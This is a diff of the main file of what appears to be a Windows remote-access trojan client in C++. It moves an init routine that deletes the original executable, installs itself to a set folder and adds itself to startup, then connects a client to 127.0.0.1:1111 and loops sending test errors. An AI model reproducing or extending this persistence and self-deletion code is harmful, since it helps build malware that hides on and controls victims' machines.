@@ -4,8 +4,7 @@
 
 */
 
-#include "includes.h"
-
+#include "general.h"
 
 
 
@@ -19,60 +18,28 @@ void testMB(std::string s)		//TEST FUNCTION
 //END TESTFUNC
 
 
-
-
-
-bool init()		//startup of program
-{
-	//VARIABLE SETUP
-	General::currentPath = General::getCurrentPath();
-	General::installFolder = General::getInstallFolder();
-	General::installPath = General::getInstallPath(General::installFolder);
-
-	
-
-	if (!(General::lpArguments == NULL || (General::lpArguments[0] == 0)) && Settings::meltSelf)		//checks if arguments are supplied (path of old file) and then melts given file (if any)
-	{
-		remove(General::lpArguments);
-	}
-
-	if (Settings::installSelf)
-	{
-		if (!General::locationSet())				//checks if it is at it's destined location (config in settings.h)
-		{
-			General::setLocation();
-			General::installing = true;
-		}
-	}
-
-	if (Settings::setStartupSelf)
-	{
-		if (!General::startupSet())				//checks if it's startup is set
-		{
-			General::setStartup(convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? convStringToWidestring(General::installPath).c_str() : convStringToWidestring(General::currentPath).c_str(), NULL);
-		}
-	}
-	
-
-	General::runInstalled();			//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
-
-	
-	return General::installing;
-}
-
-
-
-
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
 	//VARIABLE SETUP
 	General::lpArguments = lpCmdLine;
 
-	/*
-	if (init())
-		return 0;
-	*/
 
+	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
+		return 0;
+
+	Client MyClient("127.0.0.1", 1111);
+
+	if (!MyClient.Connect())
+	{
+		testMB("failed to connect");
+		return 1;
+	}
+
+	while (true)
+	{
+		testMB("looping");
+		Client::clientptr->sendError("testErr");
+	}
 	//test stuff (WORKS \o/)
 
 	return 0;
